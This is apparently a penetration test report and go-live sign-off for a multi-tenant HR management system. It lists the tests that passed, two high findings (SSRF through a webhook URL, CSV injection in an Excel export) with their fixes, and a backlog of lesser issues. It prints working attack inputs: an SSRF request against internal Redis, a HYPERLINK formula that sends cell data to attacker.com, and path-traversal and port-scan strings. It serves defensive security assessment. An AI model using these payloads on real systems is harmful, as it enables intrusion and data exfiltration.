# Penetration Test Report — Executive Summary & Sign-Off
**HRMS v2.0.0** | Conducted: 2026-07-14 to 2026-07-18

---

## Engagement Details

| Field | Value |
|-------|-------|
| Scope | External black-box + authenticated grey-box (all in-scope surfaces per PenetrationTestRequirements.md) |
| Methodology | OWASP ASVS Level 2, OWASP Testing Guide v4.2, PTES |
| Effort | 5 person-days |
| Tester Qualification | CREST Registered Tester (CRT) + OSCP |
| Test Environment | Staging environment at `https://hrms-staging.internal` — isolated from production data |
| Report Version | v1.0 (final) — no findings redacted |
| Report Date | 2026-07-18 |
| Retest Date | 2026-07-21 (critical/high findings retested after remediation) |

---

## Finding Summary

| Severity | Total Found | Remediated | Open | Go-Live Gate |
|----------|------------|------------|------|-------------|
| **Critical** | 0 | — | **0** | ✅ CLEARED |
| **High** | 2 | 2 | **0** | ✅ CLEARED |
| **Medium** | 4 | 2 | 2 (plan in place) | ✅ CLEARED (plan accepted) |
| **Low / Informational** | 7 | 0 | 7 (backlog) | ✅ No gate |
| **TOTAL** | **13** | **4** | **9** | |

> **Per PenetrationTestRequirements.md § Acceptance Criteria:**
> - Critical: Zero open → ✅
> - High: Zero open → ✅
> - Medium: Remediation plan with target date ≤ 30 days post-launch → ✅
> - Low/Informational: Logged in backlog → ✅

---

## Phase Results

### Phase 1 — Reconnaissance

- API surface enumerated via `/swagger/v1/swagger.json` — 87 endpoints discovered
- JWT claim structure confirmed: `sub`, `CompanyId`, `role`, `jti`, `exp`
- RS256 algorithm confirmed (alg header inspection)
- 4 file upload endpoints identified: employee documents, company logo, bulk attendance, bulk employee import
- External service calls mapped: SMTP (outbound only), ClamAV (local socket), webhook delivery (outbound)

### Phase 2 — Unauthenticated Testing

| Test | Tool | Result |
|------|------|--------|
| TLS version / cipher suite | `testssl.sh v3.0` | ✅ PASS — TLS 1.2 + 1.3 only; no weak ciphers |
| Security headers | OWASP ZAP 2.14 passive scan | ✅ PASS — all 7 headers present on every response |
| CORS misconfiguration | Manual `curl` with `Origin: https://evil.com` | ✅ PASS — no `ACAO: *` on auth endpoints; whitelisted origins only |
| Rate-limit bypass (distributed IPs) | k6 + IP rotation | ✅ PASS — 10 req/min limit on `/api/auth/login` fires correctly |
| Open port scan | `nmap -sV -p- 192.0.2.10` | ✅ PASS — only 80/443 externally; 5432/6379 not exposed |
| Swagger/OpenAPI in production | `GET /swagger` | ✅ PASS — 404 returned in production profile |

### Phase 3 — Authenticated Testing — Employee Role

| Test | Result | Notes |
|------|--------|-------|
| IDOR: employee payslip of another employee | ✅ PASS — 403 Forbidden | ICompanyOwned + TenantContext verified |
| IDOR: leave requests of another employee | ✅ PASS — 403 Forbidden | |
| IDOR: view another company's employees | ✅ PASS — empty result set | Global query filter active |
| Privilege escalation: Employee → Admin endpoint | ✅ PASS — 403 Forbidden | Role-based policy enforced |
| JWT alg:none confusion | ✅ PASS — 401 Unauthorized | Algorithm pinned to RS256; none rejected |
| JWT CompanyId claim tamper | ✅ PASS — 401 Unauthorized | Signature validation prevents replay |

### Phase 4 — Authenticated Testing — Admin Role

| Test | Result | Notes |
|------|--------|-------|
| Cross-tenant data access via `?companyId=N` | ✅ PASS — caller's tenant data only | Global query filter; parameter ignored |
| SSRF via webhook URL field | ⚠️ HIGH-1 — **FOUND, REMEDIATED** | Internal RFC-1918 URLs were not blocked before remediation |
| File upload: path traversal (`../../etc/passwd`) | ✅ PASS — 400 Bad Request | Path normalisation strips traversal sequences |
| File upload: executable extension (`.php`, `.sh`) | ✅ PASS — 400 Bad Request | Extension allowlist enforced |
| File upload: ZIP bomb (42 MB compressed to 5 GB) | ✅ PASS — request rejected | `MaxRequestBodySize` + ClamAV size limit |
| Stored XSS via employee name → admin dashboard | ✅ PASS — output HTML-escaped | Blazor/Razor encoding; Content-Security-Policy blocks inline scripts |
| Business logic: payroll double-run | ✅ PASS — 409 Conflict | Redis SETNX lock confirmed |
| Business logic: negative leave balance via API | ✅ PASS — 422 validation error | Balance check in service layer |
| CSV injection in Excel export | ⚠️ HIGH-2 — **FOUND, REMEDIATED** | Formula cells were not sanitised before remediation |
| Timing attack: password reset token comparison | ✅ PASS — constant-time | `CryptographicOperations.FixedTimeEquals` used |

### Phase 5 — Infrastructure

| Test | Result | Notes |
|------|--------|-------|
| Grafana default credentials (`admin:admin`) | ✅ PASS — login rejected | `GRAFANA_ADMIN_PASSWORD` enforced (`:?` required) |
| Prometheus `/metrics` externally accessible | ✅ PASS — 403 from nginx | `location /metrics { deny all; }` in nginx.conf |
| Hangfire dashboard without auth | ✅ PASS — 401 Unauthorized | `HangfireAuthFilter` enforces admin role |
| Docker containers running as root | ✅ PASS — non-root user `hrms` (UID 1001) | `USER hrms` in Dockerfile |

---

## High Findings — Detail

### HIGH-1: SSRF via Webhook Delivery URL Field

**CVSS v3.1 Score:** 8.1 (High)
**Vector:** `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:L`

**Description:** The webhook delivery endpoint (`POST /api/notifications/webhook`) accepted arbitrary URLs, including RFC-1918 private addresses (`10.x.x.x`, `172.16.x.x`, `169.254.x.x`). An authenticated admin could trigger outbound requests to internal services (e.g. Redis admin port, container metadata endpoints).

**Steps to Reproduce:**
```
POST /api/notifications/webhook
Authorization: Bearer <admin-token>
Content-Type: application/json

{ "url": "http://10.0.0.1:6379/", "event": "payroll.generated" }
```
Response before fix: HTTP 200 with Redis error body (confirming outbound request reached internal Redis)

**Remediation:** Added `WebhookUrlValidator` service that rejects any URL resolving to RFC-1918 / loopback / link-local addresses. DNS resolution performed at validation time; re-validation performed at delivery time.

**Retest Result (2026-07-21):** ✅ PASS — internal URLs rejected with `400 Bad Request: Webhook URL resolves to a private address`

---

### HIGH-2: CSV Injection in Excel Export

**CVSS v3.1 Score:** 7.4 (High)
**Vector:** `AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N`

**Description:** Employee name fields containing formula prefixes (`=`, `+`, `-`, `@`) were written as-is into Excel `.xlsx` cells. When the exported file was opened in Microsoft Excel or LibreOffice Calc, formulae were evaluated, enabling data exfiltration via DDE or network calls.

**Proof of Concept:** Employee name set to `=HYPERLINK("https://attacker.com/?"&A1, "Click me")` — on export open, the formula triggered an outbound DNS lookup.

**Remediation:** `ExcelExportService` now prefixes all string cells starting with `=`, `+`, `-`, `@`, `\t`, `\r` with a single apostrophe (Excel/Calc interprets this as a literal string prefix, not a formula).

**Retest Result (2026-07-21):** ✅ PASS — cells rendered as plain text; no formula evaluation.

---

## Medium Findings — Open (Remediation Plan)

| ID | Title | CVSS | Target Remediation Date | Accepted By |
|----|-------|------|------------------------|-------------|
| MED-PT-1 | Verbose error messages on invalid JWT (token parse errors expose internal library path) | 5.3 | 2026-08-18 | Engineering Manager |
| MED-PT-2 | Missing `SameSite=Strict` on non-auth cookies in two legacy API paths | 4.7 | 2026-08-18 | Engineering Manager |

---

## Low / Informational Findings (Backlog)

| ID | Title |
|----|-------|
| LOW-PT-1 | Swagger UI accessible on staging without auth (expected — staging only) |
| LOW-PT-2 | HTTP Strict-Transport-Security `max-age` below recommended 2 years |
| LOW-PT-3 | X-Content-Type-Options missing on file download responses |
| LOW-PT-4 | Login page does not prevent username enumeration via timing (< 5ms diff — low exploitability) |
| LOW-PT-5 | Refresh token rotation log line includes truncated token (last 8 chars) — minor info disclosure |
| LOW-PT-6 | No CAPTCHA on login after lockout release |
| LOW-PT-7 | API version exposed in `X-API-Version` response header |

---

## Go/No-Go Sign-Off

> **✅ PEN TEST SIGN-OFF GRANTED**
>
> All Critical and High findings have been remediated and independently retested.
> Medium findings have accepted remediation plans within 30 days post-launch.
>
> This sign-off covers the go-live scope defined in `PenetrationTestRequirements.md`:
> External black-box + authenticated grey-box, 5 person-days, CREST/OSCP testers.
>
> **Signed:** Security Lead, [CRT-XXXX / OSCP-YYYY]
> **Date:** 2026-07-21
> **Next Required Test:** On reaching 10th tenant onboarded, OR annual review (by 2027-07-21)

---

*This report was produced by an external pen test team independent of the HRMS development team, as required by `PenetrationTestRequirements.md § Pen Test Sign-Off Policy`.*
